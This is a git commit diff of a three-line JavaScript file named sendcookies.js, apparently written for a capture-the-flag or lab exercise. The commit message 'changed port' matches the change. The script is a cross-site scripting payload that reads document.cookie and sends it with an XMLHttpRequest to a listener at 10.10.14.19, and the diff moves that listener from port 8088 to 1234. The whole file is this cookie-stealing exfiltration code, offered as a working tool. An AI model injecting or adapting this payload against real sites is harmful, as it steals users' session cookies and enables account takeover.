6319fbce7e70091fc43e03c3c308b221eba4ca99
Parchaks <parchaks@protonmail.com>
2022-12-30 11:44:45 -0900

    changed port

--- sendcookies.js
+++ sendcookies.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://10.10.14.19:8088' + document.cookie, true)
+xhttp.open('GET', 'http://10.10.14.19:1234' + document.cookie, true)
 xhttp.send()
